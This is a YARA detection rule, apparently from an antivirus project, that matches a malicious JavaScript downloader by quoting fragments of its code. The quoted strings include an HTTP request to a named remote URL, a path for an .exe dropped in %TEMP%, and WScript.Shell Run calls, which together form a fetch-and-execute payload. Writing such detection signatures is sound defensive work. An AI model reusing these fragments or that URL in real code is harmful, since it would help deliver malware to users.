rule sig_20160329_0fb9889393da255354ce917e43d68c51 {
  meta:
    description = "datamaliciousorder - file 20160329_0fb9889393da255354ce917e43d68c51.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ea21ede5116c63d7a48aead7876aeb773ccf840a46565eb9307da82d6629f7ee"

  strings:
    $s1  = "UC[E](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function qm() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fc9LAgRNc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[qc](K() * 11); if (UC[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var L = function tA() {return WScript[u](\"WScript.Shell\");}(), au = 11;" fullword ascii
    $s5  = "function We(j, ML){M = M * 1; return j - ML;};" fullword ascii
    $s6  = "function iB(){return \"\" + o;};" fullword ascii
    $s7  = "function a(Tz){L[\"Run\"](Tz, M, M);};" fullword ascii
    $s8  = "function sR() {return ((n == true) && (n == A0)) ? 1 : M;};" fullword ascii
    $s9  = " while (F){" fullword ascii
    $s10 = "function K(){return 22;};" fullword ascii
    $s11 = "return We(Y, Lq);" fullword ascii
    $s12 = "function Nt(){return u;};" fullword ascii
    $s13 = "function e(p) {var hC = (1, 2, 3, 4, 5, p); return hC;};" fullword ascii
    $s14 = "function X()" fullword ascii
    $s15 = "var iP = new this[\"Date\"]();" fullword ascii
    $s16 = "var AC = false;" fullword ascii
    $s17 = "n = true; " fullword ascii
    $s18 = "var n = false;" fullword ascii
    $s19 = "var A0 = false;" fullword ascii
    $s20 = "A0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}